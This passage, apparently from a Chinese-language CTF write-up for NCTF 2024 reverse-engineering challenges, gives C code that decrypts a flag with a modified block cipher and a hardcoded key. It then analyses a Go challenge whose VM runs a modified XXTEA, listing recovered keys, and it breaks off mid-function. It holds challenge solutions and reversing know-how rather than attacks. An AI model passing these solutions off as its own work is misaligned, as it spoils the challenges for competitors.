<span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x48</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">unsigned</span> <span class="token keyword">int</span> dword_7FF699A4A040<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
<span class="token number">0x00070E15</span><span class="token punctuation">,</span> <span class="token number">0x1C232A31</span><span class="token punctuation">,</span> <span class="token number">0x383F464D</span><span class="token punctuation">,</span> <span class="token number">0x545B6269</span><span class="token punctuation">,</span> <span class="token number">0x70777E85</span><span class="token punctuation">,</span> <span class="token number">0x8C939AA1</span><span class="token punctuation">,</span> <span class="token number">0xA8AFB6BD</span><span class="token punctuation">,</span> <span class="token number">0xC4CBD2D9</span><span class="token punctuation">,</span>
<span class="token number">0xE0E7EEF5</span><span class="token punctuation">,</span> <span class="token number">0xFC030A11</span><span class="token punctuation">,</span> <span class="token number">0x181F262D</span><span class="token punctuation">,</span> <span class="token number">0x343B4249</span><span class="token punctuation">,</span> <span class="token number">0x50575E65</span><span class="token punctuation">,</span> <span class="token number">0x6C737A81</span><span class="token punctuation">,</span> <span class="token number">0x888F969D</span><span class="token punctuation">,</span> <span class="token number">0xA4ABB2B9</span><span class="token punctuation">,</span>
<span class="token number">0xC0C7CED5</span><span class="token punctuation">,</span> <span class="token number">0xDCE3EAF1</span><span class="token punctuation">,</span> <span class="token number">0xF8FF060D</span><span class="token punctuation">,</span> <span class="token number">0x141B2229</span><span class="token punctuation">,</span> <span class="token number">0x30373E45</span><span class="token punctuation">,</span> <span class="token number">0x4C535A61</span><span class="token punctuation">,</span> <span class="token number">0x686F767D</span><span class="token punctuation">,</span> <span class="token number">0x848B9299</span><span class="token punctuation">,</span>
<span class="token number">0xA0A7AEB5</span><span class="token punctuation">,</span> <span class="token number">0xBCC3CAD1</span><span class="token punctuation">,</span> <span class="token number">0xD8DFE6ED</span><span class="token punctuation">,</span> <span class="token number">0xF4FB0209</span><span class="token punctuation">,</span> <span class="token number">0x10171E25</span><span class="token punctuation">,</span> <span class="token number">0x2C333A41</span><span class="token punctuation">,</span> <span class="token number">0x484F565D</span><span class="token punctuation">,</span> <span class="token number">0x646B7279</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">int</span> dword_7FF699A4A028<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
<span class="token number">0xA3B1BAC6</span><span class="token punctuation">,</span> <span class="token number">0x56AA3350</span><span class="token punctuation">,</span> <span class="token number">0x677D9197</span><span class="token punctuation">,</span> <span class="token number">0xB27022DC</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">uint32_t</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token generic-function"><span class="token function">x</span> <span class="token generic class-name"><span class="token operator">&lt;&lt;</span> n<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>x <span class="token operator">>></span></span></span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">generate_buf</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">uint8_t</span><span class="token operator">*</span> key<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span><span class="token operator">*</span> buf<span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> 
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">uint32_t</span> key_dword<span class="token punctuation">;</span>
            <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>key_dword<span class="token punctuation">,</span> key <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">uint32_t</span> converted_key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>key_dword <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>key_dword <span class="token operator">&amp;</span> <span class="token number">0xFF00</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>key_dword <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF00</span><span class="token punctuation">)</span> <span class="token operator">|</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>key_dword <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dword_7FF699A4A028<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> converted_key<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> 
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">uint32_t</span> v12 <span class="token operator">=</span> dword_7FF699A4A040<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> buf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> buf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> buf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">uint8_t</span><span class="token operator">*</span> v12_bytes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>
                <span class="token punctuation">&#123;</span>
                    v12_bytes<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> byte_7FF699A4A0D0<span class="token punctuation">[</span>v12_bytes<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">uint32_t</span> rot1 <span class="token operator">=</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">uint32_t</span> rot2 <span class="token operator">=</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        buf<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>rot1 <span class="token operator">^</span> rot2 <span class="token operator">^</span> v12<span class="token punctuation">)</span> <span class="token operator">^</span> buf<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">uint8_t</span><span class="token operator">*</span> ciphertext<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">uint8_t</span><span class="token operator">*</span> key<span class="token punctuation">,</span> <span class="token keyword">uint8_t</span><span class="token operator">*</span> plaintext<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> buf<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">uint32_t</span> buf_1<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token function">generate_buf</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> ii <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ii <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> ii<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">uint32_t</span> cipher_dword<span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cipher_dword<span class="token punctuation">,</span> ciphertext <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> ii<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        buf_1<span class="token punctuation">[</span><span class="token number">35</span> <span class="token operator">-</span> ii<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>cipher_dword <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">|</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>cipher_dword <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF00</span><span class="token punctuation">)</span> <span class="token operator">|</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>cipher_dword <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF0000</span><span class="token punctuation">)</span> <span class="token operator">|</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>cipher_dword <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">31</span><span class="token punctuation">;</span> m <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> m<span class="token operator">--</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">uint32_t</span> v12_0 <span class="token operator">=</span> buf<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">^</span> buf_1<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> buf_1<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> buf_1<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">uint8_t</span><span class="token operator">*</span> v12_bytes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12_0<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span> 
        <span class="token punctuation">&#123;</span>
            v12_bytes<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> byte_7FF699A4A0D0<span class="token punctuation">[</span>v12_bytes<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">uint32_t</span> rot1 <span class="token operator">=</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>v12_0<span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">uint32_t</span> rot2 <span class="token operator">=</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>v12_0<span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">uint32_t</span> rot3 <span class="token operator">=</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>v12_0<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">uint32_t</span> rot4 <span class="token operator">=</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>v12_0<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">uint32_t</span> L_result <span class="token operator">=</span> rot1 <span class="token operator">^</span> rot2 <span class="token operator">^</span> rot3 <span class="token operator">^</span> rot4 <span class="token operator">^</span> v12_0<span class="token punctuation">;</span>
        buf_1<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> buf_1<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">^</span> L_result<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">uint32_t</span> v11 <span class="token operator">=</span> buf_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">uint8_t</span> b0 <span class="token operator">=</span> <span class="token punctuation">(</span>v11 <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
        <span class="token keyword">uint8_t</span> b1 <span class="token operator">=</span> <span class="token punctuation">(</span>v11 <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
        <span class="token keyword">uint8_t</span> b2 <span class="token operator">=</span> <span class="token punctuation">(</span>v11 <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
        <span class="token keyword">uint8_t</span> b3 <span class="token operator">=</span> v11 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
        <span class="token keyword">uint32_t</span> le <span class="token operator">=</span> <span class="token punctuation">(</span>b3 <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>b2 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>b1 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> b0<span class="token punctuation">;</span>
        <span class="token function">memcpy</span><span class="token punctuation">(</span>plaintext <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token operator">&amp;</span>le<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main_safe</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint8_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"NCTF24nctfNCTF24"</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> enc<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span>
    <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x46</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">decrypt</span><span class="token punctuation">(</span>enc<span class="token punctuation">,</span> key<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">decrypt</span><span class="token punctuation">(</span>enc<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> flag<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"NCTF&#123;%.32s&#125;\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="gogo"><a href="#gogo" class="headerlink" title="gogo"></a>gogo</h3><p>main_main函数可以看到是将输入分块通过channel进行协程通信。</p>
<p><img src="/images/1742733969787-21f818ea-b6be-4352-b828-76c4dc10e07f.png" loading="lazy"></p>
<p>在main_main函数附件有一个带VM名字的函数，里面就是接收main那边发送的数据，然后底下有个函数执行，是通过操作数进行调用函数计算。这边一系列计算函数也印证想法。</p>
<p><img src="/images/1742734066317-01e3231e-c23a-4e3f-a5d0-e97c7be1dca8.png" loading="lazy"></p>
<p><img src="/images/1742734121024-155535f9-6bfc-4362-903a-2dfd143e5b9b.png" loading="lazy"></p>
<p>对每个vm的函数都下断点输出，如XOR这样：</p>
<p><img src="/images/1742734219948-32e06585-6800-4f9b-8edc-494765f3de6e.png" loading="lazy"></p>
<p><img src="/images/1742734255077-9adf8f22-88a0-4158-9da6-92eaa88ff49e.png" loading="lazy"></p>
<p>运行输入可以得到一堆伪代码计算过程，通过看到9e3779b9以及计算的特征，可以发现是XXTEA变种。</p>
<p><img src="/images/1742734417878-d64fe88d-06aa-4999-9e95-396404fccb0d.png" loading="lazy"></p>
<p><img src="/images/1742735420532-84d41ca0-3eed-4411-80d2-858709f02190.png" loading="lazy"></p>
<p>通过分析可得知是将flag分成两份，20字节为一组，分别进行两种变种XXTEA计算，Key也不一样，不过都在这里面可以找到Key。</p>
<p>还原加密代码如下，基于标准XXTEA进行修改的：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX2</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">&lt;&lt;</span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key2<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span> <span class="token number">0x6e637466</span><span class="token punctuation">,</span> <span class="token number">0x62ef0ed</span> <span class="token punctuation">,</span><span class="token number">0xa78c0b4f</span><span class="token punctuation">,</span> <span class="token number">0x32303234</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">uint32_t</span> key2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span> <span class="token number">0x32303234</span><span class="token punctuation">,</span> <span class="token number">0xd6eb12c3</span><span class="token punctuation">,</span> <span class="token number">0x9f1cf72e</span><span class="token punctuation">,</span> <span class="token number">0x4e435446</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">xxtea_1</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>
    rounds <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
    sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">do</span>
    <span class="token punctuation">&#123;</span>
        sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>
        e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">xxtea_2</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>
    rounds <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
    sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">do</span>
    <span class="token punctuation">&#123;</span>
        sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>
        e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
